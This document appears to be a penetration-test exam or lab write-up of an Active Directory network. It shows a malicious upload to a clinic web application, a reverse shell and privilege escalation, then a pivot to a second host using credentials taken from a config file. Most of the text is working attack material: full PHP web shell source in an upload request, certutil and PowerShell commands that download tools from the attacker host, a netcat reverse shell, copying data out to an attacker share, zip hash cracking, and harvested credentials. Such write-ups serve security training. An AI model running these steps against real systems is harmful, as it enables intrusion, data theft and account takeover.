# AD

```text-plain
Exteranl host - 192.168.121.101 (MS01)
Internal host - 172.16.121.102 (MS02)

DC - 172.16.121.100 (DC)
```

‍

# 192.168.121.101 (MS01)

Rustscan output

![](assets/AD_image-20240601234411-xic439u.png)

```text-plain
PORT      STATE SERVICE       REASON
21/tcp    open  ftp           syn-ack
80/tcp    open  http          syn-ack
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack
5357/tcp  open  wsdapi        syn-ack
5985/tcp  open  wsman         syn-ack
8080/tcp  open  http-proxy    syn-ack
49669/tcp open  unknown       syn-ack
```

Nmap scan output:

![](assets/1_AD_image-20240601234411-u8d0yan.png)

#### Port 80

```text-plain
┌──(kali㉿kali-192.168.49.121)-[~/offsec/exam/AD]
└─$ gobuster dir -u http://192.168.121.101 -w /usr/share/wordlists/dirb/big.txt -o dirb/192.168.121.101_80
```

![](assets/3_AD_image-20240601234411-uqymhjd.png)

![](assets/4_AD_image-20240601234411-6idmv5n.png)

![](assets/6_AD_image-20240601234411-pejbv7a.png)

![](assets/7_AD_image-20240601234411-4q1uh2v.png)

```text-plain
Username : admin
Password : admin123
```

![](assets/8_AD_image-20240601234411-ld181jk.png)

![](assets/AD_Screenshot%20from%202024-05-29-20240601234411-kky3p6k.jpg)

## Initial Access

![](assets/9_AD_image-20240601234411-jyh9rcf.png)

[https://www.exploit-db.com/exploits/51779](https://www.exploit-db.com/exploits/51779)

![](assets/10_AD_image-20240601234411-mk8sln9.png)

![](assets/11_AD_image-20240601234411-6xigop3.png)

Intercept the upload request

![](assets/12_AD_image-20240601234411-xe5hhpc.png)

Send the post request to repeater

![](assets/13_AD_image-20240601234411-qa0yrna.png)

```text-plain
POST /webaccess/update_user.php?user_id=2 HTTP/1.1
Host: 192.168.121.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------28045307368374398462043640113
Content-Length: 5013
Origin: http://192.168.121.101
Connection: close
Referer: http://192.168.121.101/webaccess/update_user.php?user_id=2
Cookie: JSESSIONID.6f3c354e=node015foxjc2mbvdwr5ge1dbevt431.node0; PHPSESSID=22j04h596h8sff2rhkdo4tj4l9
Upgrade-Insecure-Requests: 1

-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="hidden_id"

2
-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="display_name"

John Doe
-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="username"

jdoe
-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="password"


-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="profile_picture"; filename="example.jpg"
Content-Type: image/jpeg

ÿØÿàJFIFHHÿáExifMM*ÿþCreated with The GIMPÿÛC	!"$"$ÿÛCÿÀÈ"ÿÄ	ÿÄ;		!1"AQ2#$3BCRa	&8Db¡´ÿÄÿÄÿÚ?ã EËÈ-,}²ò[nTÞÂôÍ)DKw¶+â5q/'­¼ê:%Ò{lbó&¯ëçz¦ÓûÙ	IìwÖhkí7	Jä¢2ûHõùÑ7Iá­ÿöþÕýÇzaÓûÜºw7)KÍ¿fljå×êc*"KmâQ©2Qu¾DDe£eþ;cêê+:ã6#wSþdó"ä^KÉwéÂUM¿R-a-(§ÖRJ"ZÊfGàüx1dywÑÌ;ÖeÅ,ùPØ1ÓuÔ²¨&á£¶f\À¿B^fs«êU7â¹²e-©ëjó;D´(Ýi¤ø#RÓ¢ýÓIþF­uSkI`ºûÉµ³×8òØSN'ªTDd;?,Èrj©>®7Md9%löª#Ø?¼¶¬ ¤BSjA´­,ZýÒÙæú½©OÔj&ß_[%úÒc¢ñÔ¹:n-Õzg_¼¤¨Ö~vzQÏ[ EYô³ß
³'÷o|ô»°hìv9ö»åê¹}Üw®u±så´µ­YÜâ×°]×nLº÷Zi{øÒÔ#ÿÈ¹úxíLëÔõíØÙ7ÕèÊ
ÍqñBI¡³ÞJVøó¯dy_E³¾Æ7Pð·Y¹´W²Ôí|âqôè¢¥i#I¡iJ¶"ÑkÎÏAÏ]
éÔ®©õ&![Ð}§9¸!1PÔ¢ZÒJNkà¶´üÏNºQ.Â~e7ªÈ(%Òá³²L=ã8ëI¾IuSFf²=hÌÓàËF%þ§¿êWm¹ÆfZ%Ç¸iKÉ8Î©(Qïq-ÿy)?!·ô.wRis~¢YgKÈÓÀéµðÕ~N­âBmH4÷¶jo/ZÚLù¨z¿Çr}QÓ}EgRrQÜ`¦ÄqêÌd\Éy!Þ¹Bwíâ·«¨$ó9é¯tã^ç:ÿ]â» s.útÄîzk&á]RbsÝ7\LFK Ö­§Êø~^¹Õ=V;&+þ ¬mò8ñ*XýìuJ~ÎÉ§Eµ/GäÉ^@=@l]Mb<^¤äñ¢Ö»Wmµ	ÒI.2	å4®¤í%ö2ñàÌ¼tfÄ¶µW:®%Øð,;~¶+O©-Ií«}Äé|Tfe²=@6ªÚÖ§Õû]Ø²2âJôÏ©¾û×6ÄË¢ÚOdz-{µ¯±û¹ÍöSêý}^¿Çw·¾<øý¼µ½xÞÔLZ§¡=,É«àöm¯½ßÜ¤wV®ÿbRP×ÚfiOÚE¿ÎÌo¿Wý"ÅðÛÜôö2¨!ºÛ]ç8RÒ^m|RÁÆÜ/&z%$Ëó £Y¶fÍûùYuûwR¿`C¤$)Î\DDD[?"6íg»ag6Lé'dHuN8³ýT¥ÿoõ¯¥{ú¸é¿M¨ÔPqý,^ú¨:âÔã3$©J3Qøø/Á¬Ã¡Ù5/;"b9<:Þ'ddËvën§ü·¯3]·spÝ:iµÄÊ)&
A'<Hßçµ½xØË¿Ër¬+/²k«hñÏlµ6s¯¡¿ûIj2/ ¾ú±ÐLf¦FºìÏ
¬.ª¥«Ft·dÎ}÷É§gFmdd¶K##Jx¶³$¼øu»éÆWxâú)Ö4:Å~RåÊD§É&M¸hR{&Ú­ñ2>'ðGà¢ISR¢>ìy¬Ó­,Ò´(¼2ýHMÎÍ³9Ó_7.¿*DW>óÖO-Çb(ö¨êQ«fÑí3?°{M¯ót÷ßlÆ}§ö»ÒzîÂ½ß¿èùö»ãéxýÜw¾~u¡¸\}0õ
¶}­aÚb²­`1ê­dg.{DZA)I-v¢NÔ"ß9îÖ¾Çì^ç7Ú}O«ô=õz~ÿÞÞøóãöòÖõãzÖmYUí5¹C
¿\}${7g_§¨ÿCjÍº-âJòÉSñû¤"5¶)ýkªøD¤´oÆÏFd+@KRµ-j5)Gµ(Ïfgúð"J:<1.K©elÖã«Qé(JKÊfdDEäÌÀx÷T	Ò ÎôYqS/°ófZOJB~R¢222?$d<Éè[=O¶ªôíÑê¸p¤O¯÷¿[§Ò§cw%¡M÷G´rIÈ¶^HYyÿPñcú¬Íkl-aZ`ë¬¤ÄYF¢²MÉBÒfLºF{ó­+ò9ÆûÈèýö?mTÔÒR¢¹6¥òN¹
d\¹'zÞ¹ê"@u·S°Ú/­,ÊúEE?yP´X
t4)q#5¥³þ²Sf¥'½ÇälS`ÙO¥ºúq¯eK*û¯Ó±=4IB©\|«iIèÌClºXupm%ÖMÃ¹è¥:ÂÔÚ¸¹ÛYÅFDz3Ñø0·Tj±ÿéæQ¨Ø­lj|jªÒ*;»nºä[q('Mg£/µ
2ØÝza(º|2óN¾âùVUï²¼z5£6¤¡¢aiþÉøý4~Ìr8ÍSk2®u¤JÉ² Wöýl¦RÜWû"Ò9(f[?Ì÷j¯æ{ì^çÝ¿Wè{éõoáÝíï_o-k~7±n_ûDK'<¢ñò.%gëÛô^ÓÃ]Þ\?´û~{ÇÈä môÒæ¶?ÓÇX«gÚÄfÆÅTªé	KÒMÖ§
´í|RdjÑÉu!Ón`½_Áñk« .¡1e[6A"3j¬iãq·SÿÄæ¢ÒIe²ÚfEäG#¬&µÍqî¦døLîoÈg=1d3èS<êHÉfá%$iFÒ¥$fe³0÷WHbf]Fêi#&G_ÏÜ,n¸åÏù¾µ¨Z4¡)I¤ÍJ-}Ä^?38×Gpg7Â2ùºÆö=dJÛzæ¢ÍbÏ¼ÚØïÈäU¤ämþÒ"3=j8¿^k`ßg5öÊ¢ã&E"î,;e
Ç¯ÊUÅdh4fiÚHüèæCÕì$ï1êìú©y$o)ìè¤¨aFjCL%]¾fGáfde­lFcëPzãaI6ß«÷S.É2ëe©ÆO¥öÐL×¶2i­jY|6Ù|Ôó¾SRu¦ð¡»ÇÇ3YÍFì[Å(¶pÿ¬6ÓÈZM<IDN$Ò®:=ühÏß§ÝiÆ)sÞ§Ï±C«Í&¹&4úW[fÎ}C¥)5+yJÒ÷|lxuG­µ7ÅÓ)t1²§áve¸åä²äÈeÆMOr5-F¾í¥$>)Ù é}þ¢õkzeba3kN:¸o'LÑ¥$Èþî$3ø26í_³Kñë}7½Ûpôy÷ýÅ¾ÆùxáÝíóüðå¯:3:ÁÑè¶]AºÇñµlÚÂ,¥8ÂÛ*NiJûJY£3QqI%:32º£[èô(f9eØÌ,$¥ÍÉÈm-¨f~¥m%£?õõKûü©ÞþÈ~Ó{·½Øûïºv=?¿ÿ-Ûû¸rîþÿpüìaôîÜzÕ;ß{ºíÑýF,®&÷e)Ö×ô5ÉKÏÈÇë½ïNrÌEk.LÛ­Íe¸´­%¶f®<Ýóÿ§_åæµT}ê..<ÕÏÉý³Ñ8Òm7é¤)×;j#-¤ËZ%yù×ÈB/Gú?Ã§ô·ÙFXÅÆmC_*+QZaÆãJF\Q¤²¥%("5£!#£ý?r5Çê²¹æ_"ÂÄÕ´V¼ê"}¶¿Ä5 Ï%hþ_ýP Ô^älÃ³LL2¢Ú	ÇW
ã[¦Ñô¤ÛÈÒf$AAÕ
EêÖFô;5DÌê.aW!
 Üis%´n¯II}ÜMFGðFc¡ý&Â3º
Ö¬êJ®,['>®©¯_qHA<áD¤ËFe£1t«©¢Êò~ªÜ[Ä¨¡¼V>Û­¶©2æ£f²I¹öRß>K^w|Cê­Ç°DÌo>?b,7ëªlÅ\¶ÛYsyÄN¸iÙð=%G¢Qëc	È«úÇRilpÏ#Äl²ßÇse±®ú&ÍMOi4ù$ñ?C]ô7´>1ÓÛû	ç½aÊLô%)a¨ëIÿfÙ-5ËJAñ2#/óuÅ.m3ªÐ¯aÕÆ²½ÇûSm&|	\Imõ¢5ä¾ODy}hÊÿsè¯°Ñ®¢ÃfÂaÓÍ|yä8¤R~q	pÕ¢ûT¥h¼×zãÓµ:«b¼ë·«QÑûZiGóÀ%w¸þ7òIãÙö;-Rñû»:*O;RØYèjAèF«K	ö³Ýi:LéÝ~KªqÅêjQñ ?ÿÙ
-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="save_user"


-----------------------------28045307368374398462043640113--
```

```text-plain
POST /webaccess/update_user.php?user_id=2 HTTP/1.1
Host: 192.168.121.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------28045307368374398462043640113
Content-Length: 1176
Origin: http://192.168.121.101
Connection: close
Referer: http://192.168.121.101/webaccess/update_user.php?user_id=2
Cookie: JSESSIONID.6f3c354e=node015foxjc2mbvdwr5ge1dbevt431.node0; PHPSESSID=22j04h596h8sff2rhkdo4tj4l9
Upgrade-Insecure-Requests: 1

-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="hidden_id"

2
-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="display_name"

John Doe
-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="username"

jdoe
-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="password"


-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="profile_picture"; filename="simple-backdoor.php"
Content-Type: application/x-php

<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->

-----------------------------28045307368374398462043640113
Content-Disposition: form-data; name="save_user"


-----------------------------28045307368374398462043640113--
```

![](assets/14_AD_image-20240601234411-6re7x8o.png)

![](assets/15_AD_image-20240601234411-vh3lc94.png)

Now we start our listener

```text-plain
┌──(kali㉿kali-192.168.49.121)-[~/Downloads/windows]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](assets/16_AD_image-20240601234411-5qywzow.png)

![](assets/17_AD_image-20240601234411-d6rajwc.png)

```text-plain
┌──(kali㉿kali-192.168.49.121)-[~/offsec/exam/AD]
└─$ curl 'http://192.168.121.101/webaccess/user_images/1715699084simple-backdoor.php?cmd=certutil%20-urlcache%20-f%20http://192.168.49.121/nc64.exe%20c:/windows/tasks/nc.exe'
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>****  Online  ****
CertUtil: -URLCache command completed successfully.
</pre>                                                                                                                                                                                          
```

![](assets/18_AD_image-20240601234411-anow4wj.png)

![](assets/19_AD_image-20240601234411-u0i10kl.png)

![](assets/21_AD_image-20240601234411-8ix2w04.png)

```text-plain
┌──(kali㉿kali-192.168.49.121)-[~/offsec/exam/AD]
└─$ curl 'http://192.168.121.101/webaccess/user_images/1715699084simple-backdoor.php?cmd=c:/windows/tasks/nc.exe%20192.168.49.121%204444%20-e%20cmd.exe'
```

![](assets/20_AD_image-20240601234411-t2knioj.png)

```text-plain
┌──(kali㉿kali-192.168.49.121)-[~/offsec]
└─$ rlwrap -f . -r nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.49.121] from (UNKNOWN) [192.168.121.101] 63157
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\wamp64\www\Clinic\webaccess\user_images>
```

```text-plain
C:\wamp64\www\Clinic\webaccess\user_images>whoami
whoami
ms01\a.hansen

C:\wamp64\www\Clinic\webaccess\user_images>type C:\Users\a.hansen\Desktop\local.txt
type C:\Users\a.hansen\Desktop\local.txt
b0e6590d9ddf92aec1a8d71d24271b70

C:\wamp64\www\Clinic\webaccess\user_images>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.121.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.121.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.121.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

C:\wamp64\www\Clinic\webaccess\user_images>
```

![](assets/22_AD_image-20240601234411-v4pesau.png)

## Priv Esc

```text-plain
C:\wamp64\www\Clinic\webaccess\user_images>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\wamp64\www\Clinic\webaccess\user_images>
```

![](assets/23_AD_image-20240601234411-qg7xlsm.png)

```text-plain
C:\wamp64\www\Clinic\webaccess\user_images>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\wamp64\www\Clinic\webaccess\user_images> cd C:/windows/tasks/
cd C:/windows/tasks/
PS C:\windows\tasks> iwr -uri 192.168.49.121/printspoofer64.exe -Outfile printspoofer.exe
iwr -uri 192.168.49.121/printspoofer64.exe -Outfile printspoofer.exe
PS C:\windows\tasks> ls
ls


    Directory: C:\windows\tasks


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/14/2024   9:21 AM          59392 nc.exe
-a----        5/14/2024   9:32 AM          27136 printspoofer.exe


PS C:\windows\tasks>
```

![](assets/24_AD_image-20240601234411-a3a9o4k.png)

![](assets/27_AD_image-20240601234411-aze9dwj.png)

```text-plain
PS C:\windows\tasks> ./printspoofer.exe -i -c powershell.exe
./printspoofer.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32>
```

![](assets/25_AD_image-20240601234411-mwxtboj.png)

```text-plain
PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> type C:/Users/Administrator/Desktop/proof.txt
type C:/Users/Administrator/Desktop/proof.txt

PS C:\Windows\system32> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.121.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.121.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.121.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
PS C:\Windows\system32>
```

‍

## Post Enumeration

No low hanging fruits find through bloodhound or mimi

![](assets/41_AD_image-20240601234411-b9cxm5p.png)

```text-plain
net use Z: \\192.168.45.198\MyShare /user:kali kali
```

```text-plain
C:\Users\a.hansen\Documents>copy sys.zip Z:\
copy sys.zip Z:\
        1 file(s) copied.
```

![](assets/42_AD_image-20240601234411-qwcwb61.png)

```text-plain
┌──(kali㉿kali-192.168.49.121)-[~/Public]
└─$ ls
backup.zip  exam_20240514095831_BloodHound.zip  old-site.zip  sys.zip

┌──(kali㉿kali-192.168.49.121)-[~/Public]
└─$ zip2john sys.zip > sys.hash
ver 2.0 sys.zip/sys/ is not encrypted, or stored with non-handled compression type
ver 2.0 sys.zip/sys/cafeteria.xml PKZIP Encr: cmplen=356, decmplen=979, crc=2CC50C29 ts=1C98 cs=2cc5 type=8
ver 2.0 sys.zip/sys/medical-plants.xml PKZIP Encr: cmplen=1154, decmplen=6681, crc=812CFCCD ts=1C98 cs=812c type=8
ver 2.0 sys.zip/sys/nurses.csv PKZIP Encr: cmplen=241, decmplen=426, crc=00255DE5 ts=1C98 cs=0025 type=8
ver 2.0 sys.zip/sys/pharmacy.xml PKZIP Encr: cmplen=258, decmplen=627, crc=239152ED ts=1C98 cs=2391 type=8
ver 2.0 sys.zip/sys/web.config PKZIP Encr: cmplen=722, decmplen=2059, crc=87E0D96F ts=54D7 cs=87e0 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(kali㉿kali-192.168.49.121)-[~/Public]
└─$ cat sys.hash
sys.zip:$pkzip$5*1*1*0*8*24*2391*cb929c799fac2583e91a44eb1caf33d1c583234e9abe7946e092d3971dd226a2699fc92f*1*0*8*24*2cc5*ba7c6b26ab40d2ddbba8e1808b2708587ffc9be65faf25525569cb395cebe37fe4a1158f*1*0*8*24*87e0*b9964f75d67acc256b50088964485d01039221731c98eab4778ca8263c406987916a1386*1*0*8*24*812c*faaf66a06db9cd8597b1420fd7bcd9a07943a95fbaf40e2e2e7763a631a32d88d5ae9bb3*2*0*f1*1aa*255de5*66b*2c*8*f1*0025*e8c375cceeb1a527905f38698d9c5802de5399b42ca412b94c54146b1a42e9dcb0f12d061c6b50ef494196eb816bdadff7aa996e73cbfdba78702d383e54911f940c196999ff65834d09dd39d17406fd680f02ccb90e8adf83f0777232bafa8f3ae15dae534a408c06af3cb20bf23602d6d8bc76e5c1556d7e48f916d5f4079efa60f2615e128de0f9f35dbd68651cd799eb9f77af6e55af0f6ed1c67d6ca80480b369ce67c10a540cd1f1f9a698b1f82f5fdf20ae64ab49246ff342b8bc4755d8f5709b55340b9c9b9eabb0e06b58373ffbc08528af1b809497d67c7c1917aa2f48b003e6ff99a19da22d4fb4ce1392fa*$/pkzip$::sys.zip:sys/nurses.csv, sys/pharmacy.xml, sys/cafeteria.xml, sys/web.config, sys/medical-plants.xml:sys.zip
```

![](assets/43_AD_image-20240601234411-j3t381f.png)

```text-plain
$ echo -n `$pkzip$5*1*1*0*8*24*2391*cb929c799fac2583e91a44eb1caf33d1c583234e9abe7946e092d3971dd226a2699fc92f*1*0*8*24*2cc5*ba7c6b26ab40d2ddbba8e1808b2708587ffc9be65faf25525569cb395cebe37fe4a1158f*1*0*8*24*87e0*b9964f75d67acc256b50088964485d01039221731c98eab4778ca8263c406987916a1386*1*0*8*24*812c*faaf66a06db9cd8597b1420fd7bcd9a07943a95fbaf40e2e2e7763a631a32d88d5ae9bb3*2*0*f1*1aa*255de5*66b*2c*8*f1*0025*e8c375cceeb1a527905f38698d9c5802de5399b42ca412b94c54146b1a42e9dcb0f12d061c6b50ef494196eb816bdadff7aa996e73cbfdba78702d383e54911f940c196999ff65834d09dd39d17406fd680f02ccb90e8adf83f0777232bafa8f3ae15dae534a408c06af3cb20bf23602d6d8bc76e5c1556d7e48f916d5f4079efa60f2615e128de0f9f35dbd68651cd799eb9f77af6e55af0f6ed1c67d6ca80480b369ce67c10a540cd1f1f9a698b1f82f5fdf20ae64ab49246ff342b8bc4755d8f5709b55340b9c9b9eabb0e06b58373ffbc08528af1b809497d67c7c1917aa2f48b003e6ff99a19da22d4fb4ce1392fa*$/pkzip$` > sys-filterd.hash
```

```text-plain
┌──(kali㉿kali)-[~/hashes]
└─$ hashcat -m 17225 sys.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-DO-Premium-AMD, 2919/5902 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$pkzip$5*1*1*0*8*24*2391*cb929c799fac2583e91a44eb1caf33d1c583234e9abe7946e092d3971dd226a2699fc92f*1*0*8*24*2cc5*ba7c6b26ab40d2ddbba8e1808b2708587ffc9be65faf25525569cb395cebe37fe4a1158f*1*0*8*24*87e0*b9964f75d67acc256b50088964485d01039221731c98eab4778ca8263c406987916a1386*1*0*8*24*812c*faaf66a06db9cd8597b1420fd7bcd9a07943a95fbaf40e2e2e7763a631a32d88d5ae9bb3*2*0*f1*1aa*255de5*66b*2c*8*f1*0025*e8c375cceeb1a527905f38698d9c5802de5399b42ca412b94c54146b1a42e9dcb0f12d061c6b50ef494196eb816bdadff7aa996e73cbfdba78702d383e54911f940c196999ff65834d09dd39d17406fd680f02ccb90e8adf83f0777232bafa8f3ae15dae534a408c06af3cb20bf23602d6d8bc76e5c1556d7e48f916d5f4079efa60f2615e128de0f9f35dbd68651cd799eb9f77af6e55af0f6ed1c67d6ca80480b369ce67c10a540cd1f1f9a698b1f82f5fdf20ae64ab49246ff342b8bc4755d8f5709b55340b9c9b9eabb0e06b58373ffbc08528af1b809497d67c7c1917aa2f48b003e6ff99a19da22d4fb4ce1392fa*$/pkzip$:hospital6575
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 17225 (PKZIP (Mixed Multi-File))
Hash.Target......: $pkzip$5*1*1*0*8*24*2391*cb929c799fac2583e91a44eb1c...pkzip$
Time.Started.....: Thu May 30 05:07:48 2024 (1 sec)
Time.Estimated...: Thu May 30 05:07:49 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1359.0 kH/s (1.04ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 651264/14344385 (4.54%)
Rejected.........: 0/651264 (0.00%)
Restore.Point....: 649216/14344385 (4.53%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ihearthim. -> hondasp2
```

![](assets/44_AD_image-20240601234411-r4h8090.png)

```text-plain
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModule" resourceType="Unspecified" />
    </handlers>
    <aspNetCore processPath="dotnet" arguments=".\Microsoft.IIS.Administration.dll" forwardWindowsAuthToken="true" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" />
    <appSettings>
    <add key="ApiURL" value="https://...../servlets/AssetServlet" />
    <add key="ApiUserName" value="rudi.davis" />
    <add key="ApiPassword" value="SysAdmin4Life!" /> 
```

![](assets/45_AD_image-20240601234411-p8d08h5.png)

```text-plain
┌──(kali㉿kali-192.168.49.121)-[~/Public/sys]
└─$ NetExec winrm 172.16.121.102 -u rudi.davis -p "SysAdmin4Life\!" --continue-on-success
WINRM       172.16.121.102  5985   MS02             [*] Windows 10 / Server 2019 Build 17763 (name:MS02) (domain:oscp.exam)
WINRM       172.16.121.102  5985   MS02             [+] oscp.exam\rudi.davis:SysAdmin4Life! (Pwn3d!)
```

![](assets/46_AD_image-20240601234411-h9vvhjc.png)

![](assets/47_AD_image-20240601234411-tpwalqu.png)

```text-plain
┌──(kali㉿kali-192.168.49.121)-[~/Public/sys]
└─$ evil-winrm -i 172.16.121.102 -u rudi.davis -p "SysAdmin4Life\!"

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\rudi.davis\Documents>
*Evil-WinRM* PS C:\Users\rudi.davis\Documents>
```

```text-plain
*Evil-WinRM* PS C:\Users\rudi.davis\Documents> whoami
oscp\rudi.davis
*Evil-WinRM* PS C:\Users\rudi.davis\Documents> type C:/Users/rudi.davis/Desktop/local.txt

*Evil-WinRM* PS C:\Users\rudi.davis\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.121.102
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.121.254
```
